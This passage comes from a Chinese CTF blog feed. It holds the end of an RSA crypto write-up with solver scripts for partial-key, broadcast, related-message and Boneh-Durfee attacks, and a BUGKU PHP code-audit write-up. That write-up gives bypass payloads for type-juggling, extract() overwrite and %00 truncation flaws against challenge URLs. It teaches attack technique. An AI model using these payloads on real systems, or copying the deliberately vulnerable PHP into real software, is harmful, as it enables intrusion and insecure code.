class="hljs-title">find_p</span><span class="hljs-params">(d0, kbits, e, n)</span>:</span>    X = var(<span class="hljs-string">'X'</span>)    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, e+<span class="hljs-number">1</span>):        results = solve_mod([e*d0*X - k*X*(n-X+<span class="hljs-number">1</span>) + k*n == X], <span class="hljs-number">2</span>^kbits)        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> results:            p0 = ZZ(x[<span class="hljs-number">0</span>])            p = partial_p(p0, kbits, n)            <span class="hljs-keyword">if</span> p:                <span class="hljs-keyword">return</span> p<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    n = <span class="hljs-number">0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54b</span>    e = <span class="hljs-number">3</span>    d = <span class="hljs-number">0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418ab</span>    beta = <span class="hljs-number">0.5</span>    epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>    nbits = n.nbits()    kbits = floor(nbits*(beta^<span class="hljs-number">2</span>+epsilon))    d0 = d &amp; (<span class="hljs-number">2</span>^kbits<span class="hljs-number">-1</span>)    <span class="hljs-keyword">print</span> <span class="hljs-string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)    p = find_p(d0, kbits, e, n)    <span class="hljs-keyword">print</span> <span class="hljs-string">"found p: %d"</span> % p    q = n//p    <span class="hljs-keyword">print</span> d    <span class="hljs-keyword">print</span> inverse_mod(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))lower <span class="hljs-number">291</span> bits (of <span class="hljs-number">1019</span> bits) <span class="hljs-keyword">is</span> givenfound p: <span class="hljs-number">1556928330519222949185052385205770511398851299027067030656737931164636055914888549373041706626311467428902396847671677538586996128733508490246169051729867</span><span class="hljs-number">11276456863053049846778143161914757923513133539274086554204762345263769886584929828068603961625809916094813748871857226391606896679593696242167359171991723</span><span class="hljs-number">2529140489407550411860842517642709534323596281579020017754223390342047118996108186564106911103882855078009689932113065210547912624644857741988858283570121514938039297592621259739497542591992130948345362969430345095193882648382370898025817668567519357247651572797940766217498405274704879818312077507052181675</span></code></pre><h3 id="challenge4-–-Basic-Broadcast-Attack">challenge4 – Basic Broadcast Attack<a class="post-anchor" href="#challenge4-–-Basic-Broadcast-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 3 completed[++++++++++++++++][+]Generating challenge 4[+]e=3[+]m=random.getrandbits(512)[+]n1=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848fL[+]c1=pow(m,e,n1)=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06L[+]n2=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783L[+]c2=pow(m,e,n2)=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7L[+]n3=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697L[+]c3=pow(m,e,n3)=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cbL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27</span></code></pre><h3 id="challenge5-–-Related-Message-Attack">challenge5 – Related Message Attack<a class="post-anchor" href="#challenge5-–-Related-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 4 completed[++++++++++++++++][+]Generating challenge 5[+]n=0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434L[+]x=pow(m+1,e,n)=0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> <span class="hljs-string">"m==\n"</span> + hex(m) + <span class="hljs-string">"\n"</span><span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h3 id="challenge6-–-Boneh-and-Durfee-attack">challenge6 – Boneh and Durfee attack<a class="post-anchor" href="#challenge6-–-Boneh-and-Durfee-attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 5 completed[++++++++++++++++][+]Generating challenge 6[+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L[+]d=random.getrandbits(1024*0.270)[+]e=invmod(d,phin)[+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>GitHub开源项目RSA-and-LLL-attacks<br>解密可得</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> libnum.n2s(m)</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> long_to_bytes(m).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h2 id="参考链接">参考链接<a class="post-anchor" href="#参考链接"></a></h2><p><a href="http://www.realwz.com/2018/03/rsainctf.html" target="_blank" rel="noopener">http://www.realwz.com/2018/03/rsainctf.html</a><br><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a><br><a href="https://findneo.github.io/180727rsa-attack/" target="_blank" rel="noopener">https://findneo.github.io/180727rsa-attack/</a><br><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a><br><a href="https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/</a><br><a href="https://www.anquanke.com/post/id/158944#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158944#h2-4</a><br><a href="https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA" target="_blank" rel="noopener">https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKUCTF-代码审计</title>
      <link href="/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="extract变量覆盖">extract变量覆盖<a class="post-anchor" href="#extract变量覆盖"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">'xxx'</span>;extract($_GET);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))&#123;$content=trim(file_get_contents($flag));<span class="hljs-comment">#trim() 函数移除字符串两侧的空白字符或其他预定义字符。</span><span class="hljs-comment">#file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。</span><span class="hljs-keyword">if</span>($shiyan==$content)&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()函数, 将GET方式获得的变量导入到当前的符号表中<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以Payload ：<code>?shiyan=&amp;content=</code></p><p>那么在使用函数extract()的时候, 如何防止这种漏洞呢<br>可以在使用的时候加上参数EXTR_SKIP<br>这个参数表示如果有冲突，不覆盖已有的变量<br>或者还有EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</p><h3 id="strcmp比较字符串">strcmp比较字符串<a class="post-anchor" href="#strcmp比较字符串"></a></h3><p>源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><span class="hljs-comment">//比较两个字符串（区分大小写）</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>解这道题，就只要传入一个非字符串类型的变量即可，一般情况下，我们我们传数组，所以payload为：?a[]=123</p><h3 id="urldecode二次编码绕过">urldecode二次编码绕过<a class="post-anchor" href="#urldecode二次编码绕过"></a></h3><p>源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,$_GET[id]))<span class="hljs-comment">//eregi()函数在一个字符串搜索指定的模式的字符串</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"not allowed!"</span>);<span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"Access granted!"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>就是需要构造get链接就可以得到答案：利用了两次urldecode第一次是浏览器的解码第二次是函数的解码</p><h3 id="md5-函数">md5()函数<a class="post-anchor" href="#md5-函数"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li><li>严格比较：用两个等号 === 比较，除了比较值，也比较类型。<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>payload= <code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=0</code></li></ul><h3 id="数组返回NULL绕过">数组返回NULL绕过<a class="post-anchor" href="#数组返回NULL绕过"></a></h3><p>源码 <a href="http://123.206.87.240:9009/19.php" target="_blank" rel="noopener">题目地址</a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-comment">//查找 "--" 在字符串中第一次出现的位置</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/19.php?password[]=1223</code>自己都搞不懂为什么<br>先来谈论一下标准的答案：<br>第一个条件：</p><ul><li>必须以数字或者字母开头（其实看到ereg就可以想到%00截断）</li></ul><p>第二个条件：</p><ul><li>必须在password参数中找到–。</li></ul><p>所以得出以下正解：<br><code>index.php?password=a%00--</code><br>那么话又说回来了，为什么直接password[]=a就可以绕过呢？<br>1.ereg只能处理字符，而你是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。<br>2.strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。<br>所以可以拿到flag</p><h3 id="弱类型整数大小比较绕过">弱类型整数大小比较绕过<a class="post-anchor" href="#弱类型整数大小比较绕过"></a></h3><p><a href="[http://123.206.87.240:9009/22.php]" title="http://123.206.87.240:9009/22.php">传送门</a></p><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><ul><li>payload<code>http://123.206.87.240:9009/22.php?password=1444a</code>还是不知道为什么…</li><li>payload<code>http://123.206.87.240:9009/22.php?password[]=1</code><br>PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。</li><li>payload<code>http://120.24.86.145:9009/22.php?password=2345%20</code>或者<code>http://120.24.86.145:9009/22.php?password=2345%00</code><br>is_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断。</li></ul><h3 id="sha-函数比较绕过">sha()函数比较绕过<a class="post-anchor" href="#sha-函数比较绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span 